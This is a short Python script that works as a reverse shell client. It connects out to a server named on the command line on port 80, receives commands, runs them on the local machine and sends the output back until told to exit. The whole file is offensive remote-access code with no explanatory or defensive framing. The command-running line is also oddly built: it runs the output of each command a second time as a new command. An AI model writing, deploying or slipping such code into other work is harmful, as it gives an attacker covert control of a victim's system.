import os
import socket
import time
import sys
import subprocess

SERVER_HOST = sys.argv[1]
SERVER_PORT = 80
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

currentdir = os.getcwd()
s.send(currentdir.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break

    output = subprocess.getoutput(os.popen(command).read())
    message = f"{output}{SEPARATOR}"
    s.send(message.encode())
s.close()